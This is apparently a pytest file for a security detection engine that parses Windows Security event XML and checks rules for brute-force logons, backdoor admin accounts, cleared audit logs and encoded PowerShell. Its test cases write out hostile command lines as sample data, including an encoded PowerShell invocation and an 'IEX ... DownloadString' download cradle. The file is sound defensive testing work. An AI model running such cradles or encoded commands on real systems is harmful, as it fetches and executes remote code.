"""Windows Security XML parsing and the win-* rules."""

from datetime import datetime, timezone
from pathlib import Path

import pytest

from app.detection import DEFAULT_RULES_DIR, DetectionEngine, load_rules
from app.parsers import PARSERS
from app.parsers.windows_event import parse_line
from app.schema import Outcome

RULES = load_rules(DEFAULT_RULES_DIR)
SAMPLE = Path(__file__).parent.parent / "samples" / "windows_security.xml"
NS = 'xmlns="http://schemas.microsoft.com/win/2004/08/events/event"'


def ev(eid, sec, data, host="WS01"):
    d = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
    t = f"2026-10-26T10:{sec // 60:02d}:{sec % 60:02d}.1234567Z"
    return (
        f"<Event {NS}><System><EventID>{eid}</EventID><TimeCreated SystemTime=\"{t}\"/>"
        f"<Computer>{host}</Computer></System><EventData>{d}</EventData></Event>"
    )


def logon(sec, ok=False, ip="203.0.113.50", user="admin"):
    return ev(4624 if ok else 4625, sec, {"TargetUserName": user, "LogonType": "3", "IpAddress": ip})


def fired(lines):
    engine = DetectionEngine(RULES)
    alerts = []
    for raw in lines:
        event = parse_line(raw)
        assert event is not None, raw
        alerts.extend(engine.process(event))
    return sorted(a.rule_id for a in alerts)


def test_registered_as_source():
    assert PARSERS["windows"] is parse_line


def test_failed_logon_fields():
    e = parse_line(ev(4625, 5, {"TargetUserName": "bob", "LogonType": "10", "IpAddress": "198.51.100.4", "IpPort": "5000", "SubStatus": "0xc000006a"}))
    assert e.timestamp == datetime(2026, 10, 26, 10, 0, 5, 123456, tzinfo=timezone.utc)
    assert e.host.name == "WS01"
    assert (e.event.action, e.event.outcome) == ("win_logon", Outcome.FAILURE)
    assert (e.user.name, e.source.ip, e.source.port) == ("bob", "198.51.100.4", 5000)
    assert e.labels == {"logon_type": "10", "sub_status": "0xc000006a"}


def test_local_logon_has_no_source_ip():
    assert parse_line(logon(0, ok=True, ip="-")).source.ip is None


def test_process_created():
    e = parse_line(ev(4688, 0, {"SubjectUserName": "bob", "NewProcessName": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c whoami"}))
    assert e.process.name == "cmd.exe" and e.labels["command"] == "cmd /c whoami"


@pytest.mark.parametrize(
    "line",
    ["", "not xml", "<Event><broken", ev(4616, 0, {}), '<!DOCTYPE x [<!ENTITY a "b">]><Event/>',
     "<Event><System><EventID>x</EventID></System></Event>"],
)
def test_unrecognized_or_unsafe_input_returns_none(line):
    assert parse_line(line) is None


PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def proc(cmd, exe=PS):
    return ev(4688, 0, {"SubjectUserName": "bob", "NewProcessName": exe, "CommandLine": cmd})


CASES = {
    "5 failed logons": ([logon(i * 5) for i in range(5)], ["win-brute-force"]),
    "4 failed logons": ([logon(i * 5) for i in range(4)], []),
    "failures then success": ([*[logon(i * 5) for i in range(5)], logon(40, ok=True)], ["win-brute-force", "win-brute-force-success"]),
    "success from another ip": ([*[logon(i * 5) for i in range(5)], logon(40, ok=True, ip="198.51.100.1")], ["win-brute-force"]),
    "created and made admin": (
        [ev(4720, 0, {"TargetUserName": "svc", "TargetSid": "S-1-5-21-1"}), ev(4732, 10, {"MemberSid": "S-1-5-21-1", "TargetUserName": "Administrators"})],
        ["local-account-created", "win-backdoor-account"],  # the generic rule also covers Windows 4720
    ),
    "added to a harmless group": (
        [ev(4720, 0, {"TargetUserName": "svc", "TargetSid": "S-1-5-21-1"}), ev(4732, 10, {"MemberSid": "S-1-5-21-1", "TargetUserName": "Users"})],
        ["local-account-created"],
    ),
    "different account made admin": (
        [ev(4720, 0, {"TargetUserName": "svc", "TargetSid": "S-1-5-21-1"}), ev(4732, 10, {"MemberSid": "S-1-5-21-2", "TargetUserName": "Administrators"})],
        ["local-account-created"],
    ),
    "audit log cleared": (
        [f'<Event {NS}><System><EventID>1102</EventID><TimeCreated SystemTime="2026-10-26T10:00:00Z"/><Computer>WS01</Computer></System><UserData><LogFileCleared><SubjectUserName>bob</SubjectUserName></LogFileCleared></UserData></Event>'],
        ["win-audit-log-cleared"],
    ),
    "encoded powershell": ([proc("powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=")], ["win-encoded-powershell"]),
    "download cradle": ([proc("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x')")], ["win-encoded-powershell"]),
    "plain powershell": ([proc("powershell.exe Get-Date")], []),
    "encoded flag on another binary": ([proc("tool.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=", exe="C:\\x\\tool.exe")], []),
}


@pytest.mark.parametrize("lines,expected", CASES.values(), ids=CASES.keys())
def test_rule_case(lines, expected):
    assert fired(lines) == sorted(expected)


def test_every_win_rule_has_a_positive_case():
    covered = {r for _, exp in CASES.values() for r in exp}
    assert {r for r in covered if r.startswith("win-")} == {r.id for r in RULES if r.id.startswith("win-")}


def test_sample_attack_scenario():
    assert fired(SAMPLE.read_text().splitlines()) == sorted(
        ["local-account-created", "win-audit-log-cleared", "win-backdoor-account", "win-brute-force", "win-brute-force-success", "win-encoded-powershell"]
    )
